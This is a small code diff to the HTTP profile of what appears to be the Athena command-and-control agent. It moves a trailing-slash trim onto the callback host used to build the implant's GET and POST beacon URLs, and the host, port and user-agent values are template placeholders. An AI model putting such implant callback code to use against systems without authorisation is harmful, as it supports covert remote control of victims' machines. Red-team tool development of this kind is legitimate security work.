@@ -40,14 +40,14 @@ namespace Athena.Profiles.HTTP
         {
             HttpClientHandler handler = new HttpClientHandler();
             int callbackPort = Int32.Parse("callback_port");
-            string callbackHost = "callback_host".TrimEnd('/');
+            string callbackHost = "callback_host";
             string getUri = "get_uri";
             string queryPath = "query_path_name";
             string postUri = "post_uri";
             this.userAgent = "%USERAGENT%";
             this.hostHeader = "%HOSTHEADER%";
-            this.getURL = $"{callbackHost}:{callbackPort}/{getUri}?{queryPath}=";
-            this.postURL = $"{callbackHost}:{callbackPort}/{postUri}";
+            this.getURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{getUri}?{queryPath}=";
+            this.postURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{postUri}";
             this.proxyHost = "proxy_host:proxy_port";
             this.proxyPass = "proxy_pass";
             this.proxyUser = "proxy_user";
